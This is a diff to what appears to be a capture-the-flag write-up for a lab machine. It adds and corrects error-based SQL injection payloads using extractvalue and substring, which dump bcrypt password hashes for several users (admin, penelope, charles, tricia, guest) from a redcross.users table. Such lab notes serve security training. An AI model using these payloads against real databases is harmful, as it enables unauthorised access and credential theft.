@@ -134,18 +134,29 @@ Machine IP: 10.10.10.113 - Debian
   - Query2 : (User:admin - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 0,1) FROM 30)))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229368328-a49d9ad2-7b8d-4023-8cc5-c77205eccbd7.png)
   - Combining Both: `$2y$10$z/d5GiwZuFqjY1jRiKIPzuPX` + `Kt0SthLOyU438ajqRBtrb7ZADpwq.` = `$2y$10$z/d5GiwZuFqjY1jRiKIPzuKt0SthLOyU438ajqRBtrb7ZADpwq.`
-  - Creds: `admin:$2y$10$z/d5GiwZuFqjY1jRiKIPzuKt0SthLOyU438ajqRBtrb7ZADpwq.`
+  - Creds: `$2y$10$z/d5GiwZuFqjY1jRiKIPzuKt0SthLOyU438ajqRBtrb7ZADpwq.`
 
   - Query3 : (User:penelope - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 1,1) FROM 1)))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229368782-66383407-b465-43b7-9538-107ad69ded4b.png)
   - Query4 : (User:penelope - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 1,1) FROM 32)))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229368975-08d51824-c0de-47d1-84a0-d2b1dab60ee5.png)
   - Combining Both: `$2y$10$tY9Y955kyFB37GnW4xrC0.J.` + `FzmkrQhxD..vKCQICvwOEgwfxqgAS` = `$2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS`
-  - Creds: `penelope:$2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS`
+  - Creds: `$2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS`
 
-  - Query5 : (User:penelope - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 2,1) FROM 1)))-- -`
+  - Query5 : (User:charles - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 2,1) FROM 1)))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229369088-df1b99bb-715c-4880-818f-c49a98127147.png)
-  - Query6 : (User:penelope - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 2,1) FROM 32)))-- -`
+  - Query6 : (User:charles - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 2,1) FROM 32)))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229369140-0567522b-90ad-4848-a589-9b313197cee5.png)
-  - Combining Both: `$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xP` + `xjRQkqU6T8cs683Eus/Y89GHs.G7i` = `$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i`
-  - Creds: `penelope:$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i`
+  - Creds: `$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i`
+
+  - Query5 : (User:tricia - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 3,1) FROM 1)))-- -`
+![image](https://user-images.githubusercontent.com/83878909/229369626-20e036fb-d87c-470b-9d24-1df824df2309.png)
+  - Query5 : (User:tricia - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 3,1) FROM 32)))-- -`
+![image](https://user-images.githubusercontent.com/83878909/229369689-f8f72344-686c-4c4f-bef1-f6b8098abe28.png)
+  - Creds: `$2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r.`
+
+  - Query5 : (User:guest - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 4,1) FROM 1)))-- -`
+![image](https://user-images.githubusercontent.com/83878909/229369765-07879956-6632-461d-b8d7-3545d0b1c519.png)
+  - Query5 : (User:guest - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 4,1) FROM 32)))-- -`
+![image](https://user-images.githubusercontent.com/83878909/229369808-d6c53a4e-207e-45d9-ac72-c0ee947107e6.png)
+  - Creds: `$2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi`
